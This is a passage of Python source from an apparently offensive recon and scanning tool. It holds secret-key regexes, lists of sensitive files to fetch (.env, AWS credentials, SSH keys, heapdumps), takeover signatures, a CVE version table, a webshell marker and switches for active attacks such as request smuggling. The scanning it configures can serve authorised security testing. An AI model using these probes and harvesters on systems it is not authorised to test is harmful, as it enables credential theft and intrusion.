    "Jenkins":       [b"Dashboard [Jenkins]", b"x-jenkins"],
    "n8n":           [b"n8n.io"],
    "WordPress":     [b"wp-content", b"wp-includes"],
    "Next.js":       [b"x-nextjs", b"__NEXT_DATA__"],
    "Nginx":         [b"nginx"],
    "Apache":        [b"Apache"],
    "Tomcat":        [b"Apache Tomcat"],
    "Plesk":         [b"Plesk"],
    "OpenVPN":       [b"OpenVPN"],
    "Django":        [b"csrfmiddlewaretoken", b"__admin_media_prefix__"],
    "Flask":         [b"werkzeug"],
    "PHP":           [b"X-Powered-By: PHP"],
    "React":         [b"data-reactroot", b"__REACT"],
    "Vercel":        [b"vercel"],
    "Cloudflare":    [b"cf-ray"],
    "Sentry":        [b"sentry"],
    "Discourse":     [b"discourse"],
    "Phabricator":   [b"phabricator", b"Phabricator"],
    "Pentaho":      [b"pentaho"],
    "Jupyter":      [b"jupyter", b"JupyterLab", b"notebook"],
    "Airflow":      [b"Airflow", b"airflow"],
    "Ghost":        [b'content="Ghost'],
}
TAKEOVER = {
    "AWS S3":            [b"NoSuchBucket", b"The specified bucket does not exist"],
    "Azure":             [b"404 - Blob not found", b"404 Web Site not found", b"404 Not Found: Blob"],
    "Azure CDN":         [b"404 - Not Found<br>The resource you have requested"],
    "GitHub Pages":      [b"There isn't a GitHub Pages site here"],
    "Heroku":            [b"no-such-app", b"herokucdn.com/error-pages/no-such-app"],
    "Fastly":            [b"Fastly error: unknown domain"],
    "Shopify":           [b"Sorry, this shop is currently unavailable"],
    "Pantheon":          [b"404error-unknown-site-id"],
    "Wordpress.com":     [b"doesn't exist</h1>"],
    "Zendesk":           [b"Help Center Closed"],
    "Freshdesk":         [b"account not found"],
    "Statuspage":        [b"Status page doesn't exist"],
    "Netlify":           [b"Not Found - Request ID"],
    "Unbounce":          [b"this page is not published"],
    "Cargo":             [b"cargo.site"],
    "Surge":             [b"project not found"],
    "Ghost":             [b"ghost.io"],
    "Firebase":          [b"Firebase Hosting Not Found"],
    "Vercel":            [b"DEPLOYMENT_NOT_FOUND",
                          b"NOT_FOUND - The page could not be found"],
    "Tumblr":            [b"There's nothing here."],
    "Readme":            [b"project not found"],
    "Webflow":           [b"well, this is awkward"],
    "Helpjuice":         [b"Helpjuice is not installed yet",
                          b"we could not find what you were looking for"],
    "Help Scout":        [b"NO SITE CONFIGURED"],
}
# body text alone is too generic for these (plain mentions of ghost.io /
# cargo.site, or any page with "doesn't exist</h1>") - trusted only in
# takeover_confirm where the CNAME chain-end already implicates the service,
# never as a bare-body tech tag in probe_one
GENERIC_FP = frozenset({"Wordpress.com", "Ghost", "Cargo", "Readme",
                        "Helpjuice"})
CNAME_TAKEOVER = ("s3.amazonaws.com", "s3-website", "azurewebsites.net", "blob.core.windows.net",
                  "github.io", "herokuapp.com", "fastly.net", "shopify.com", "pantheonsite.io",
                  "wordpress.com", "wpengine.com", "zendesk.com", "freshdesk.com",
                  "statuspage.io", "netlify.app", "netlify.com", "vercel.app", "surge.sh",
                  "cloudfront.net", "unbouncepages.com", "cargo.site", "ghost.io", "tumblr.com",
                  "firebaseapp.com", "web.app", "readme.io", "webflow.io", "webflow.com",
                  "bubble.io", "carrd.co", "glitch.me", "fly.dev", "onrender.com",
                  "deno.dev", "pages.dev", "workers.dev", "supabase.co", "super.site",
                  "notion.site", "helpjuice.com", "helpscoutdocs.com", "userexist.com",
                  "kinsta.com", "azurestaticapps.net")

SECRETS = [
    ("AWS Access Key",     rb"(?<![A-Za-z0-9])(AKIA|ASIA|ABIA|ACCA)[0-9A-Z]{16}(?![A-Za-z0-9])"),
    ("AWS Secret Key",     rb"(?i)aws.{0,60}?secret.{0,20}[\"'=:\s]{1,6}[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])"),
    ("Google API Key",     rb"(?<![A-Za-z0-9])AIza[0-9A-Za-z_\-]{35}(?![A-Za-z0-9])"),
    ("Google OAuth",       rb"ya29\.[0-9A-Za-z_\-]{30,}"),
    ("GitHub Token",       rb"gh[pousr]_[A-Za-z0-9]{30,255}(?![A-Za-z0-9])"),
    ("Slack Token",        rb"xox[baprs]-[0-9A-Za-z\-]{10,250}"),
    ("Slack Webhook",      rb"https://hooks\.slack\.com/services/[A-Za-z0-9]+/[A-Za-z0-9]+/[A-Za-z0-9]+"),
    ("Stripe Live Key",    rb"(?<![A-Za-z0-9])sk_live_[0-9a-zA-Z]{24,99}"),
    ("Stripe Restricted Key", rb"(?<![A-Za-z0-9])rk_live_[0-9a-zA-Z]{24,99}"),
    ("SendGrid Key",       rb"SG\.[A-Za-z0-9_\-]{16,32}\.[A-Za-z0-9_\-]{32,64}"),
    ("SendGrid Webhook",   rb"(?<![A-Za-z0-9])whsec_[A-Za-z0-9]{16,}"),
    ("Mailgun Key",        rb"(?<![A-Za-z0-9\-])key-[0-9a-zA-Z]{32}(?![0-9a-zA-Z])"),
    ("npm Token",          rb"npm_[A-Za-z0-9]{36}"),
    ("PyPI Token",         rb"pypi-AgEIcHlwaS5vcmc[A-Za-z0-9_\-]{50,}"),
    ("GitHub PAT",         rb"(?<![A-Za-z0-9])github_pat_[A-Za-z0-9_]{22,255}(?![A-Za-z0-9])"),
    ("GitLab Token",       rb"(?<![A-Za-z0-9])glpat-[A-Za-z0-9_\-]{20,}"),
    ("DigitalOcean Token", rb"(?<![A-Za-z0-9])dop_v1_[a-f0-9]{64}(?![a-f0-9])"),
    ("Twitter/X Bearer",   rb"(?<![A-Za-z0-9])xapp-[A-Za-z0-9]{20,}"),
    ("Private Key",        rb"-----BEGIN (RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----"),
    ("PGP Private Key",    rb"-----BEGIN PGP PRIVATE KEY BLOCK-----"),
    ("Encrypted Private Key", rb"-----BEGIN ENCRYPTED PRIVATE KEY-----"),
    ("Bearer Token",       rb"(?i)bearer\s+[A-Za-z0-9._\-]{25,}"),
    ("Password in Query",  rb"(?i)[?&](password|passwd|pwd|secret)=[^&\s\"']{6,}"),
    ("Generic Secret",     rb"(?i)(api[_-]?key|secret|auth[_-]?token|access[_-]?token)[\"'\s:=]{1,6}[\"'][A-Za-z0-9_\-]{16,64}[\"']"),
    ("Basic Auth in URL",  rb"[a-z][a-z0-9+.\-]*://[^/\s:@]+:[^/\s:@]+@[^/\s]+"),
]

# evidence gate for [SECRET]: documentation examples, dummy values and
# degenerate strings are never findings (matches are scanned in blob
# content, where docs live alongside real keys)
_SECRET_PLACEHOLDER_RX = re.compile(
    rb"(?i)example|your[_-]?|changeme|change[_-]?me|placeholder|redacted|"
    rb"dummy|fake[_-]?|sample[_-]?|not[_-]?a[_-]?secret|insert[_-]?here|"
    rb"xxxx+|0{8,}|foobar|redacted")
_SECRET_RUN_RX = re.compile(rb"([A-Za-z0-9])\1{15,}")
# literal placeholders never secret: JSON/JS null/undefined/test values that
# happen to sit where a key would be quoted
_SECRET_LIT_RX = re.compile(
    rb"(?i)^\s*[\"'](?:null|undefined|false|true|none|nan|test|xxx|\$\{[^}]*\})"
    rb"[\"']\s*$|^\s*(?:null|undefined|none)\s*$")

SENS_FILES = ["/.env", "/.env.local", "/.env.production", "/.git/config", "/.git/HEAD",
              "/package.json", "/composer.json", "/config.json", "/wp-config.php.bak",
              "/backup.zip", "/.svn/entries", "/actuator/env", "/actuator/heapdump",
              "/jolokia/", "/jolokia/version", "/__debug__/", "/console",
              "/actuator", "/phpinfo.php",
              "/Jenkinsfile", "/.gitlab-ci.yml", "/.travis.yml",
              "/.circleci/config.yml",
              "/swagger-ui.html", "/swagger-ui/", "/api-docs",
              "/v2/api-docs", "/openapi.json", "/swagger.json",
              "/h2-console", "/elmah.axd", "/trace.axd",
              "/v1/sys/mounts", "/application/master", "/default/master",
              "/nacos/v1/auth/users?pageNo=1&pageSize=5",
              "/adminer.php", "/phpmyadmin/", "/server-info",
              "/jmx-console/", "/invoker/JMXInvokerServlet",
              "/.aws/credentials",
              "/id_rsa", "/server-status", "/.DS_Store",
              "/.git/index", "/.htpasswd", "/.htaccess", "/web.config",
              "/.npmrc", "/WEB-INF/web.xml", "/dump.sql", "/.svn/wc.db",
              "/.idea/workspace.xml", "/wp-config.php~", "/wp-config.php",
              "/package-lock.json", "/composer.lock", "/yarn.lock",
              "/Gemfile.lock", "/Dockerfile", "/requirements.txt"]

SENS_TAG = {
    "/jolokia/": ("JOLOKIA",
                  "Jolokia JMX-over-HTTP agent exposed - MBean invoke is an "
                  "RCE surface"),
    "/jolokia/version": ("JOLOKIA",
                         "Jolokia JMX-over-HTTP agent exposed - MBean invoke "
                         "is an RCE surface"),
    "/__debug__/": ("DEBUG-TOOLBAR",
                    "Django debug toolbar exposed - full request/response "
                    "data and SQL leak"),
    "/console": ("DEBUG-CONSOLE",
                 "Werkzeug interactive debugger console - RCE once the PIN "
                 "is derived or leaked"),
    "/actuator": ("ACTUATOR",
                  "Spring Boot actuator discovery surface exposed - the "
                  "/actuator root lists every enabled endpoint"),
    "/wp-config.php": ("WP-CONFIG-READABLE",
                       "wp-config.php served as PHP source (not executed) - "
                       "DB_NAME/DB_USER/DB_PASSWORD exposed, rotate every "
                       "credential and fix the handler to execute .php"),
    "/wp-config.php~": ("WP-CONFIG-READABLE",
                        "wp-config.php served as PHP source (not executed) - "
                        "DB_NAME/DB_USER/DB_PASSWORD exposed, rotate every "
                        "credential and fix the handler to execute .php"),
    "/phpinfo.php": ("PHPINFO",
                     "phpinfo() exposed - environment variables, "
                     "credentials and build paths disclosed"),
    "/swagger-ui.html": ("API-DOCS",
                         "Swagger UI exposed - complete API endpoint "
                         "surface for attackers"),
    "/swagger-ui/": ("API-DOCS",
                     "Swagger UI exposed - complete API endpoint surface "
                     "for attackers"),
    "/api-docs": ("API-DOCS",
                  "OpenAPI/Swagger spec exposed - complete API endpoint "
                  "surface for attackers"),
    "/v2/api-docs": ("API-DOCS",
                     "Swagger v2 spec exposed - complete API endpoint "
                     "surface for attackers"),
    "/openapi.json": ("API-DOCS",
                      "OpenAPI spec exposed - complete API endpoint surface "
                      "for attackers"),
    "/swagger.json": ("API-DOCS",
                      "Swagger spec exposed - complete API endpoint surface "
                      "for attackers"),
    "/actuator/env": ("ACTUATOR-ENV",
                      "Spring Boot /actuator/env discloses every config "
                      "property - datasource passwords, API keys and "
                      "credentials in propertySources"),
    "/actuator/heapdump": ("ACTUATOR-HEAPDUMP",
                           "Full JVM heapdump downloadable - live secrets, "
                           "session tokens and credentials sit in process "
                           "memory"),
    "/h2-console": ("H2-CONSOLE",
                    "H2 database console exposed - SQL access becomes RCE "
                    "via CREATE ALIAS ... AS 'code'"),
    "/elmah.axd": ("ELMAH",
                   "ELMAH error log exposed - stack traces, connection "
                   "strings and sometimes full request bodies with "
                   "credentials"),
    "/trace.axd": ("TRACE-AXD",
                   "ASP.NET application trace exposed - request headers, "
                   "query strings and viewstate details for every request"),
    "/v1/sys/mounts": ("VAULT-MOUNTS",
                       "HashiCorp Vault mount list readable unauthenticated "
                       "- secret engine paths exposed, often with unsealed "
                       "KV reads"),
    "/application/master": ("CONFIG-LEAK",
                            "Spring Cloud Config server returns property "
                            "sources - database passwords and API keys in "
                            "plain config"),
    "/default/master": ("CONFIG-LEAK",
                        "Spring Cloud Config server returns property "
                        "sources - database passwords and API keys in "
                        "plain config"),
    "/nacos/v1/auth/users?pageNo=1&pageSize=5": ("NACOS-USERS",
                                                 "Nacos user list readable "
                                                 "unauthenticated - every "
                                                 "console username "
                                                 "enumerated for brute "
                                                 "force"),
    "/adminer.php": ("ADMINER",
                     "Adminer database admin panel exposed - SQL access to "
                     "every database the server can reach"),
    "/phpmyadmin/": ("PMA-EXPOSED",
                     "phpMyAdmin login panel exposed - brute-force target "
                     "for database credentials"),
    "/server-info": ("SERVER-INFO",
                     "Apache mod_info exposed - build version, module list, "
                     "loaded config and environment variables disclosed"),
    "/jmx-console/": ("JBOSS-CONSOLE",
                      "JBoss JMX console exposed - MBean invoke is an RCE "
                      "surface"),
    "/invoker/JMXInvokerServlet": ("JBOSS-INVOKER",
                                   "JBoss invoker answers with a Java "
                                   "serialized object - JMXInvokerServlet "
                                   "deserialization RCE (CVE-2017-12149 "
                                   "class)"),
}

# command/query params commonly wired to webshell wrappers
SHELL_MARK = b"sxeShell77"

HREF_RE = re.compile(rb"""(?:href|src|action|data-url|data-href|data-src)\s*=\s*["']([^"'\s]{2,300})["']""", re.I)
# GET forms: the action URL alone misses the real query keys the browser
# submits (method=get is also the HTML default when the attribute is absent)
FORM_RX = re.compile(rb"""<form\b([^>]*)>(.*?)</form>""", re.I | re.S)
FORM_METHOD_POST_RX = re.compile(rb"""method\s*=\s*["']?\s*post\s*["']?""", re.I)
FORM_ACTION_RX = re.compile(rb"""action\s*=\s*["']([^"'\s]{1,300})["']""", re.I)
FORM_NAME_RX = re.compile(rb"""name\s*=\s*["']([^"'\s]{1,64})["']""", re.I)
FETCH_RE = re.compile(rb"""(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(\s*["']([^"']{2,300})["']""", re.I)
OPEN_RE = re.compile(rb"""\.open\(\s*["'][A-Z]{3,7}["']\s*,\s*["']([^"']{2,300})["']""")
API_RE = re.compile(rb"""["'`](/(?:api|apis|v[0-9]+|graphql|gql|rest|services?|ajax|internal|private|gateway|rpc|oauth|auth|webhook|feeds?|config|sdk)[a-zA-Z0-9._~()@!$*+,;=:%/-]{0,200})["'`]""")
STATIC_EXT = (".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".woff", ".woff2",
              ".ttf", ".eot", ".ico", ".map", ".mp4", ".webm", ".webp", ".avi", ".mov")

# ---------------- phase 11: content discovery ----------------
DIR_PATHS = sorted(dict.fromkeys("""
admin administrator admin.php login signin sign-in signup register logout
dashboard panel console manage manager management backend backoffice back-office
phpmyadmin pma myadmin adminer adminer.php dbadmin mysql sqladmin pgadmin
swagger swagger-ui swagger-ui.html swagger.json openapi.json openapi.yaml openapi
api-docs v2/api-docs v3/api-docs swagger-resources redoc docs api/docs api/v1/docs
graphql graphiql gql playground altair hasura graphql/console voyager
actuator actuator/health actuator/info actuator/metrics actuator/beans
actuator/configprops actuator/mappings actuator/loggers actuator/heapdump
actuator/threaddump actuator/refresh heapdump threaddump
metrics health healthz readyz livez ping version info status env config configuration
debug trace trace.axd elmah elmah.axd log logs logging
phpinfo.php info.php test.php i.php l.php cmd.php shell.php
server-info server.html cgi-bin cgi-bin/test.cgi jmx-console web-console invoker
jolokia jolokia/list hudson job jobs solr solr/admin jenkins manager/html
host-manager manager/status grafana kibana prometheus alertmanager jaeger zipkin
sentry _cat/indices _search discover
.git .git/config .git/HEAD .svn .svn/entries .env .env.local .env.staging .env.backup
.env.test .env.production .aws id_rsa id_rsa.pub .bash_history .bashrc .ssh
.htpasswd .htaccess web.config WEB-INF/web.xml META-INF .vscode .idea .DS_Store
robots.txt sitemap.xml sitemap_index.xml crossdomain.xml security.txt
.well-known/security.txt .well-known/assetlinks.json favicon.ico
readme README.md README changelog CHANGELOG.md LICENSE LICENSE.md CONTRIBUTING.md
backup backups backup.tar.gz backup.sql dump.sql db.sql database.sql data.sql
site.zip www.zip old oldsite temp tmp test testing staging dev demo sandbox qa uat
upload uploads upload.php files file static assets export import download downloads
wp-admin wp-login.php wp-content wp-includes xmlrpc.php wp-json/wp/v2/users
user users account accounts profile settings setup setup.py install installer
update upgrade migrate seed internal intranet portal crm erp hr
jira confluence bitbucket gitlab github redmine sonarqube nexus artifactory
registry docker kubernetes k8s rancher helm airflow dags dag jupyter notebooks
lab ml tensorboard streamlit dash pentaho superset metabase
report reports analytics stats statistics monitoring
tenant tenants org organization partner partners b2b merchant merchants store shops
mail webmail roundcube smtp mailman phplist vpn remote gateway bastion jump
websocket ws admin/login administrator/index.php admin.html dashboard.html
login.html account/login console/login sso/login auth/login api/v1 api/v2 api/v3
rest oauth sso saml ldap adfs id identity oidc cas forgot reset password reset-password
billing invoice invoices orders order payments pay checkout subscription
""".split()))
DIR_CRIT = {".git", ".git/config", ".git/HEAD", ".svn", ".svn/entries", ".env", ".env.local",
            ".env.staging", ".env.backup", ".aws", "server-info", "actuator/heapdump",
            "actuator/threaddump", "manager/html", "_cat/indices", "_search", "phpinfo.php",
            "adminer.php", "phpmyadmin", "id_rsa", "id_rsa.pub", ".bash_history", ".ssh",
            "WEB-INF/web.xml", "dump.sql", "backup.sql", "db.sql", "database.sql", "data.sql",
            ".htpasswd", "jolokia/list", "heapdump", "cmd.php", "shell.php", "backup.tar.gz",
            "site.zip", "www.zip"}
DIR_HOT_RE = re.compile(
    r"(?i)admin|login|sign-?in|dashboard|panel|console|swagger|openapi|graphql|graphiql"
    r"|debug|trace|metrics|health|jmx|jolokia|manage|back-?office|backend|phpmyadmin"
    r"|\bpma\b|grafana|kibana|jenkins|airflow|superset|metabase|sentry|solr|wp-admin"
    r"|wp-login|forgot|reset|oauth|sso|/auth|actuator|heapdump|elmah|solr|console")

SPEC_PATHS = ["/swagger.json", "/openapi.json", "/openapi.yaml", "/v2/api-docs",
              "/v3/api-docs", "/swagger-resources", "/swagger-ui.html", "/swagger/index.html",
              "/api-docs", "/api/docs", "/redoc", "/docs", "/openapi", "/swagger",
              "/.well-known/openapi.json"]
GQL_PATHS = ["/graphql", "/api/graphql", "/v1/graphql", "/gql", "/graphiql"]
LLM_MODEL_PATHS = ("/v1/models", "/api/v1/models")
LLM_COMPLETION = "/v1/chat/completions"

# ---------------- phase 15: surface + CVE ----------------
EMAIL_RE = re.compile(rb"(?<![A-Za-z0-9._%+-])[A-Za-z0-9._%+-]{1,64}@[A-Za-z0-9.-]{1,80}"
                      rb"\.[A-Za-z]{2,24}(?![A-Za-z0-9])")
PHONE_RE = re.compile(rb"(?<![0-9])(?:\+?91[-\s.]?)?[6-9][0-9]{9}(?![0-9])")
PHONE_CTX_RX = re.compile(
    rb"tel:|phone|mobile|whatsapp|telephone|helpline|contact|call us"
    rb"|customer care", re.I)
PRIVIP_RE = re.compile(rb"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}"
                       rb"|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}"
                       rb"|127\.\d{1,3}\.\d{1,3}\.\d{1,3})\b")
BAD_EMAIL = (".png@", ".jpg@", ".gif@", ".svg@", ".css@", ".js@", "@example.", "@localhost",
             "w3.org", "xmlsoap", "@sentry.", "domain.com", "email.com", "@test.", "noreply@github",
             "user@host", "@yoursite", "@emailaddress")
# final-label file extensions: retina assets like open-vpn-logo@2x.png are not emails
BAD_EMAIL_TLD = frozenset({
    "png", "jpg", "jpeg", "gif", "svg", "webp", "bmp", "ico",
    "css", "js", "json", "xml", "txt", "pdf", "map",
    "zip", "rar", "gz", "exe", "dll", "apk", "jar",
    "mp3", "mp4", "wav", "ogg", "webm", "avi",
    "woff", "woff2", "ttf", "otf", "eot",
})


def _bad_email(e):
    """precision gate for harvested emails. plain substring matching over the
    BAD_EMAIL tuple used to kill legitimate addresses (domain.com is a
    substring of realdomain.com; @test. matches latest.test) - domain-shaped
    entries are now matched on label boundaries instead."""
    if any(x in e for x in (".png@", ".jpg@", ".gif@", ".svg@", ".css@", ".js@")):
        return True                     # asset reference, not an address
    at = e.rfind("@")
    if at < 1:
        return True
    local, dom = e[:at], e[at + 1:]
    if local == "user" and dom == "host":
        return True
    if local in ("noreply", "no-reply") and (
            dom == "github.com" or dom.startswith("github.")):
        return True
    if dom.startswith(("test.", "example.", "sentry.", "yoursite",
                       "emailaddress")) or dom == "localhost":
        return True
    for d in ("domain.com", "email.com", "w3.org", "xmlsoap"):
        if dom == d or dom.endswith("." + d):
            return True
    return False
SENS_PARAMS = {"token", "access_token", "refresh_token", "id_token", "api_key", "apikey",
               "secret", "client_secret", "password", "passwd", "pwd", "session", "sid",
               "auth", "authorization", "otp", "signature", "sig", "key", "code", "bearer",
               "accesstoken", "auth_token", "csrf", "xsrf"}

# (product regex, min ver, max ver, severity tag, label) - versions normalised to 4 parts
CVE_DB = [
    (r"openssh[_ ]?(\d+\.\d+(?:\.\d+)?)", "6.8.0.0", "7.4.999.9", "CVE-HIGH",
     "CVE-2016-10009 OpenSSH agent-forwarding local privilege escalation"),
    (r"openssh[_ ]?(\d+\.\d+(?:\.\d+)?)", "7.5.0.0", "7.6.999.9", "CVE-MED",
     "CVE-2018-15473 OpenSSH authentication user enumeration"),
    (r"nginx/(\d+\.\d+\.\d+)", "1.3.9.0", "1.13.2.9", "CVE-MED",
     "CVE-2017-7529 nginx range filter integer overflow / info leak"),
    (r"nginx/(\d+\.\d+\.\d+)", "1.13.3.0", "1.15.4.9", "CVE-MED",
     "CVE-2018-16842 nginx error_page memory leak"),
    (r"apache/(\d+\.\d+\.\d+)", "2.4.49.0", "2.4.49.9", "CVE-CRIT",
     "CVE-2021-41773 Apache path traversal / RCE"),
    (r"apache/(\d+\.\d+\.\d+)", "2.4.50.0", "2.4.50.9", "CVE-CRIT",
     "CVE-2021-42013 Apache path traversal / RCE"),
    (r"apache/(\d+\.\d+\.\d+)", "2.4.0.0", "2.4.37.9", "CVE-MED",
     "CVE-2019-0211 Apache cgid local privilege escalation"),
    (r"tomcat/(\d+\.\d+\.\d+)", "6.0.0.0", "9.0.30.9", "CVE-HIGH",
     "CVE-2020-1938 Ghostcat AJP file read / inclusion (verify port 8009)"),
    (r"tomcat/(\d+\.\d+\.\d+)", "8.0.0.0", "8.0.46.9", "CVE-MED",
     "CVE-2017-12615 Tomcat PUT JSP upload (needs readonly=false)"),
    (r"apache/(\d+\.\d+\.\d+)", "2.4.0.0", "2.4.51.9", "CVE-MED",
     "CVE-2022-22720 Apache HTTP request smuggling (fixed 2.4.52)"),
    (r"nginx/(\d+\.\d+\.\d+)", "1.6.1.0", "1.16.1.9", "CVE-MED",
     "CVE-2019-20372 nginx error_page request smuggling"),
    (r"php/(\d+\.\d+\.\d+)", "7.1.0.0", "7.3.13.9", "CVE-CRIT",
     "CVE-2019-11043 php-fpm + nginx path_info RCE (vulnerable config)"),
    (r"microsoft-iis/(\d+\.\d+)", "6.0.0.0", "7.5.99.9", "CVE-CRIT",
     "CVE-2017-7269 IIS WebDAV ScStoragePathFromUrl unauth RCE (WebDAV on)"),
    (r"proftpd\s*1\.3\.3c", None, None, "CVE-CRIT",
     "ProFTPD 1.3.3c supply-chain backdoor (verify urgently)"),
    (r"drupal\s*[/]?\s*(\d+\.\d+\.\d+|\d+\.\d+)", "7.0.0.0", "7.57.99.9",
     "CVE-CRIT", "CVE-2018-7600 Drupalgeddon2 RCE (Drupal 7 <7.58)"),
    (r"drupal\s*[/]?\s*(\d+\.\d+\.\d+|\d+\.\d+)", "8.0.0.0", "8.5.1.9",
     "CVE-CRIT", "CVE-2018-7600 Drupalgeddon2 RCE (Drupal 8 <8.5.1)"),
    (r"vsftpd\s*2\.3\.4", None, None, "CVE-CRIT",
     "vsftpd 2.3.4 backdoor (CVE-2011-2523)"),
]
EOL_DB = [
    (r"nginx/(\d+\.\d+\.\d+)", "1.0.0.0", "1.13.99.9", "nginx <1.14 (EOL long ago)"),
    (r"nginx/(\d+\.\d+\.\d+)", "1.14.0.0", "1.19.99.9", "nginx 1.14-1.19 (EOL branches)"),
    (r"nginx/(\d+\.\d+\.\d+)", "1.20.0.0", "1.20.999.9", "nginx 1.20 (EOL Apr 2022)"),
    (r"nginx/(\d+\.\d+\.\d+)", "1.21.0.0", "1.22.999.9", "nginx 1.21/1.22 (EOL Apr 2024)"),
    (r"nginx/(\d+\.\d+\.\d+)", "1.23.0.0", "1.24.999.9", "nginx 1.23/1.24 (EOL Apr 2025)"),
    (r"php/(\d+\.\d+\.\d+)", "5.0.0.0", "7.3.99.9", "PHP <7.4 (EOL Nov 2022)"),
    (r"php/(\d+\.\d+\.\d+)", "7.4.0.0", "7.4.999.9", "PHP 7.4 (EOL Nov 2023)"),
    (r"php/(\d+\.\d+\.\d+)", "8.0.0.0", "8.0.999.9", "PHP 8.0 (EOL Nov 2023)"),
    (r"python/(\d+\.\d+\.\d+)", "2.0.0.0", "3.7.99.9", "Python <3.8 (EOL)"),
    (r"python/(\d+\.\d+\.\d+)", "3.8.0.0", "3.8.999.9", "Python 3.8 (EOL Oct 2024)"),
    (r"python/(\d+\.\d+\.\d+)", "3.9.0.0", "3.9.999.9", "Python 3.9 (EOL Oct 2025)"),
    (r"tomcat/(\d+\.\d+\.\d+)", "6.0.0.0", "8.0.99.9", "Tomcat 6/7/8.0 (EOL)"),
    (r"tomcat/(\d+\.\d+\.\d+)", "8.5.0.0", "8.5.999.9", "Tomcat 8.5 (EOL Mar 2024)"),
    (r"apache/(\d+\.\d+\.\d+)", "2.0.0.0", "2.2.99.9", "Apache httpd 2.2 (EOL Jul 2017)"),
]
JS_CVE_DB = [
    (r"jquery[-./](\d+\.\d+\.\d+)", "1.6.0.0", "3.3.4.9",
     "CVE-2019-11358 jQuery <3.4.0 prototype pollution"),
    (r"jquery[-./](\d+\.\d+\.\d+)", "1.6.0.0", "1.11.3.9",
     "CVE-2015-9251 jQuery <1.12 / <2.2 / <3.x cross-domain script inclusion"),
    (r"jquery-ui[-./](\d+\.\d+\.\d+)", "1.6.0.0", "1.12.1.9",
     "CVE-2021-41182 jQuery UI <1.13 XSS"),
    (r"jqueryui[-./](\d+\.\d+\.\d+)", "1.6.0.0", "1.12.1.9",
     "CVE-2021-41182 jQuery UI <1.13 XSS"),
    (r"lodash[-./](\d+\.\d+\.\d+)", "4.0.0.0", "4.17.10.9",
     "CVE-2019-10744 lodash <4.17.11 prototype pollution"),
    (r"handlebars[-./](\d+\.\d+\.\d+)", "3.0.0.0", "4.7.6.9",
     "CVE-2021-23369 handlebars <4.7.7 untrusted template RCE"),
    (r"bootstrap[-./](\d+\.\d+\.\d+)", "4.0.0.0", "4.3.0.9",
     "CVE-2019-8331 bootstrap <4.3.1 tooltip XSS"),
    (r"moment[-./](\d+\.\d+\.\d+)", "2.0.0.0", "2.19.2.9",
     "CVE-2017-18214 moment <2.19.3 ReDoS"),
    (r"angular[-./](\d+\.\d+\.\d+)", "1.0.0.0", "1.8.2.9",
     "CVE-2022-25869 AngularJS <1.8.3 XSS (EOL framework)"),
    (r"underscore[-./](\d+\.\d+\.\d+)", "1.0.0.0", "1.13.0.9",
     "CVE-2021-23358 underscore <1.13.1 template injection RCE"),
    (r"axios[-./](\d+\.\d+\.\d+)", "1.0.0.0", "1.5.9.9",
     "CVE-2023-45857 axios <1.6.0 XSRF token leak"),
    (r"marked[-./](\d+\.\d+\.\d+)", "0.0.0.0", "4.0.9.9",
     "CVE-2022-21680/81 marked <4.0.10 ReDoS"),
    (r"semver[-./](\d+\.\d+\.\d+)", "0.0.0.0", "7.5.1.9",
     "CVE-2022-25883 semver <7.5.2 ReDoS"),
]


# ---------------- targets ----------------
def parse_targets(argv_targets, csv_targets):
    raw = csv_targets or " ".join(argv_targets)
    if not raw.strip():
        print("Enter targets (comma or space separated), e.g. magicpin.in,magicpin.com")
        raw = input("> ").strip()
    out, seen = [], set()
    for p in re.split(r"[,\s;]+", raw):
        p = p.strip().lower().rstrip(".")
        p = re.sub(r"^https?://", "", p).split("/")[0]
        if p and p not in seen:
            seen.add(p); out.append(p)
    if not out:
        sys.exit("no valid targets")
    return out


def normalize_targets(raw):
    """parse user-entered targets: comma/space lists, full URLs, wildcards, @files."""
    out, seen = [], set()

    def add(tok):
        t = tok.lower().strip().rstrip(".")
        t = re.sub(r"^[*.\s]+", "", t)
        if "://" in t:
            try:
                t = urlsplit(t).hostname or ""
            except Exception:
                t = ""
        t = t.split("/")[0].split("?")[0].split("#")[0]
        t = t.split("@")[-1].split(":")[0]
        if not t or t in seen or not TARGET_RE.fullmatch(t):
            return
        seen.add(t)
        out.append(t)
        if t.startswith("www."):
            add(t[4:])                      # www.example.com -> also example.com

    for p in re.split(r"[,\s;]+", raw or ""):
        if not p:
            continue
        if p.startswith("@"):
            try:
                with open(p[1:], encoding="utf-8", errors="ignore") as fh:
                    for line in fh:
                        for q in re.split(r"[,\s;]+", line.strip()):
                            if q and not q.startswith("#"):
                                add(q)
            except OSError:
                pass
            continue
        add(p)
    return out


def ask(prompt, default=""):
    try:
        v = input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        return default
    return v or default


def apply_quick(a):
    """minutes-long recon: DNS + probe + ports + takeover + CVE only.
    switches off every heavy/active group - brute, crawl, wayback, secrets,
    files, mining, dirs/vhost/api/methods, params, tls, sweep, nuclei,
    buckets, ws, smuggle, PUT/DELETE, user-enum, smtp relay, authz."""
    a.nobrute = True
    a.crawl_n = 0
    a.wayback = False
    a.secrets = False
    a.files = False
    a.mine = False
    a.dirs = a.vhost = a.api = a.methods = False
    a.params = a.tlsscan = a.sweep = a.nuclei = False
    a.authz = False
    a.buckets = a.ws = a.smuggle = False
    a.putdel = a.userenum = a.smtp = False
    a.nsecwalk = False


def apply_custom(a):
    def yn(q, default=True):
        v = ask(f"      {q} [{'Y/n' if default else 'y/N'}] ")
        if not v:
            return default
        return v[0].lower() == "y"
    a.nobrute = not yn("DNS brute-force wordlist", True)
    a.portscan = yn("port scan + banner grab", True)
    disc = yn("content discovery (dirs/vhosts/api/methods)", True)
    a.dirs = a.vhost = a.api = a.methods = disc
    leak = yn("JS secrets + sensitive files + wayback", True)
    a.secrets = a.files = a.wayback = leak
    act = yn("active attacks (params + TLS config + netblock sweep)", True)
    a.params = a.tlsscan = a.sweep = act
    a.nuclei = yn("nuclei template scan", True)
    v = ask(f"      crawl pages per host (0-100) [{a.crawl_n}] ")
    try:
        if v:
            a.crawl_n = max(0, min(100, int(v)))
    except ValueError:
        pass


BANNER = "\n" + "=" * 70 + \
    "\n subenum v9 - automated subdomain recon + active scanning (19 phases)" + \
